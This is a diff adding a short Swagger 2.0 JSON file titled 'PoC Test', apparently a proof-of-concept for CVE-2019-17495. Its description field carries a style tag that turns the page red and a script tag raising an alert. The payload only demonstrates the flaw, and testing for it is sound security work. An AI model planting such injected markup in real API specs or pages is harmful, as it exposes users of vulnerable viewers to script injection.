@@ -1,0 +1,9 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "PoC Test",
+    "version": "1.0",
+    "description": "<style>body { background-color: red !important; }</style><script>alert('CVE-2019-17495 Verified')</script>"
+  },
+  "paths": {}
+}
